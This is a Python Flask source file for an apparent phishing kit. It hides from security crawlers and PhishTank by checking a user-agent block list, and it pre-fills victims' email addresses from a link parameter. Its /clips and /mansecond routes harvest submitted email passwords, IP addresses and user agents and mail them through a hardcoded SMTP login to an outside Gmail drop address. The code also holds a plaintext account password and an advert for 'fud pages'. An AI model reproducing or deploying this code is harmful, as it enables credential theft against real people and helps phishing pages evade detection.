from flask import Flask, request, abort, render_template, session, redirect, url_for, make_response, jsonify
import secrets
import random
import io
import string
import hashlib
import time
import base64
import json
from flask_limiter.util import get_remote_address
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)
app.secret_key = "secure_key_2025"

BOT_KEYWORDS = [
'Googlebot', 
'Baiduspider', 
'ia_archiver',
'R6_FeedFetcher', 
'NetcraftSurveyAgent', 
'Sogou web spider',
'bingbot', 
'Yahoo! Slurp', 
'facebookexternalhit', 
'PrintfulBot',
'msnbot', 
'Twitterbot', 
'UnwindFetchor', 
'urlresolver', 
'Butterfly', 
'TweetmemeBot',
'PaperLiBot',
'MJ12bot',
'AhrefsBot',
'Exabot',
'Ezooms',
'YandexBot',
'SearchmetricsBot',
'phishtank',
'PhishTank',
'picsearch',
'TweetedTimes Bot',
'QuerySeekerSpider',
'ShowyouBot',
'woriobot',
'merlinkbot',
'BazQuxBot',
'Kraken',
'SISTRIX Crawler',
'R6_CommentReader',
'magpie-crawler',
'GrapeshotCrawler',
'PercolateCrawler',
'MaxPointCrawler',
'R6_FeedFetcher',
'NetSeer crawler',
'grokkit-crawler',
'SMXCrawler',
'PulseCrawler',
'Y!J-BRW',
'80legs.com/webcrawler',
'Mediapartners-Google', 
'Spinn3r', 
'InAGist', 
'Python-urllib', 
'NING', 
'TencentTraveler',
'Feedfetcher-Google', 
'mon.itor.us', 
'spbot', 
'Feedly',
'bot',
'curl',
"spider",
"crawler"
]

SUSPICIOUS_IPS = ["1.1.1.1", "8.8.8.8", "127.0.0.1", "::1"]
def is_suspicious_request(req):
    ip = req.remote_addr
    ua = (req.headers.get("User-Agent") or "").lower()

    # Allow localhost / dev environments
    if ip in ["127.0.0.1", "::1"]:
        return False

    # Basic production checks
    for word in BOT_KEYWORDS:
        if word in ua:
            return True

    # Be forgiving about headers while testing
    if not req.headers.get("Accept-Language"):
        return False

    return False


# --- Simple cookie-based rate limiter ---
def check_rate_limit(limit=8, period=60):
    cookie = request.cookies.get("rate_limiter")
    now = int(time.time())
    data = {"tokens": limit, "last": now}

    if cookie:
        try:
            decoded = json.loads(base64.b64decode(cookie))
            elapsed = now - decoded["last"]
            tokens = min(limit, decoded["tokens"] + elapsed * (limit / period))
            if tokens < 1:
                return False, make_response("Too Many Requests", 429)
            else:
                data = {"tokens": tokens - 1, "last": now}
        except Exception:
            pass

    resp = make_response()
    encoded = base64.b64encode(json.dumps(data).encode()).decode()
    resp.set_cookie("rate_limiter", encoded, httponly=True)
    return True, resp


@app.before_request
def init_cookie():
    if "verify_cookie" not in session:
        session["verify_cookie"] = hashlib.sha256(str(time.time()).encode()).hexdigest()


@app.route("/")
def index():
    # Bot check
    if is_suspicious_request(request):
        abort(403)

    ok, resp = check_rate_limit(limit=10, period=60)  # 10 requests per minute
    if not ok:
        return resp  # Return the rate-limit response if triggered

    if not session.get("verified_human"):
        return render_template("verify.html")

    # Capture ref param and extract email & domain
    ref_param = request.args.get("ref")
    if ref_param and "@" in ref_param:
        session["email_id"] = ref_param
        session["domain_part"] = ref_param.split("@")[1]

    # Return a fresh response directly, not using 'resp'
    return render_template(
        "index.html",
        emaila=session.get("email_id"),
        domaina=session.get("domain_part")
    )

@app.route("/verify", methods=["POST"])
def verify():
    data = request.get_json()
    fingerprint = data.get("fingerprint")
    interactions = data.get("mouseMoves")
    cookie_check = data.get("cookie")
    delay = data.get("delay", 0)

    # --- Fingerprint validation ---
    if not fingerprint or len(fingerprint) < 20:
        return jsonify({"status": "bot_detected"}), 403

    # --- Interaction validation ---
    if not interactions or len(interactions) < 1:
        # allow if there was a human delay of > 1s (some users just tap)
        if delay < 1000:
            return jsonify({"status": "bot_detected"}), 403

    # --- Cookie check ---
    if cookie_check != session.get("verify_cookie"):
        return jsonify({"status": "bot_detected"}), 403

    session["verified_human"] = True
    return jsonify({"status": "verified"})


@app.route("/clips", methods=['POST'])
def clips():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For')
        if ip is None:
            ip = request.headers.get('X-Real-IP')
        if ip is None:
            ip = request.headers.get('X-Client-IP')
        if ip is None:
            ip = request.remote_addr
        email = request.form.get("emailapive")
        passwordemail = request.form.get("passwordapive")
        sender_email = "behcunipma@goonline.id"
        sender_emaill = "contact"
        receiver_email = "masonhal8063@gmail.com"
        password = "Behc03756"
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "new Upsate ## invoice"
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        Hi,
        How are you?
        contact me on icq jamescartwright for your fud pages
        """
        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        with smtplib.SMTP_SSL("goonline.id", 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        # Set session value and redirect
        session['eman'] = email  # Save email as session variable
        return redirect(url_for('mesona', web=email))

@app.route("/mesonap", methods=['GET'])
def mesona():
    eman = session.get('eman')  # email from first step
    dman = session.get('ins')   # email from second step

    # extract domain from whichever exists
    domain_value = None
    if dman and "@" in dman:
        domain_value = dman.split("@")[1]
    elif eman and "@" in eman:
        domain_value = eman.split("@")[1]

    # store domain for reuse if needed
    session['domain_part'] = domain_value

    return render_template('indexc.html', eman=eman, dman=domain_value)


@app.route("/mansecond", methods=['POST'])
def mansecond():
    if request.method == 'POST':
        ip = request.headers.get('X-Forwarded-For')
        if ip is None:
            ip = request.headers.get('X-Real-IP')
        if ip is None:
            ip = request.headers.get('X-Client-IP')
        if ip is None:
            ip = request.remote_addr
        email = request.form.get("emailail")
        passwordemail = request.form.get("passwordail")
        sender_email = "behcunipma@goonline.id"
        sender_emaill = "contact"
        receiver_email = "masonhal8063@gmail.com"
        password = "Behc03756"
        useragent = request.headers.get('User-Agent')
        message = MIMEMultipart("alternative")
        message["Subject"] = "new Upsate ## invoice"
        message["From"] = sender_email
        message["To"] = receiver_email
        text = """\
        Hi,
        How are you?
        contact me on icq jamescartwright for your fud pages
        """
        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)
        with smtplib.SMTP_SSL("goonline.id", 465) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
        session['ins'] = email  # Save email as session variable
        return redirect(url_for('pilom', web=email))


@app.route("/pilomp", methods=['GET'])
def pilom():
    userip = request.headers.get("X-Forwarded-For")
    useragent = request.headers.get("User-Agent")
    
    if useragent in BOT_KEYWORDS:
        abort(403)  # forbidden
    
    if request.method == 'GET':
        dman = session.get('ins')
    return render_template('main.html', dman=dman)




if __name__ == "__main__":
    app.run(debug=True)



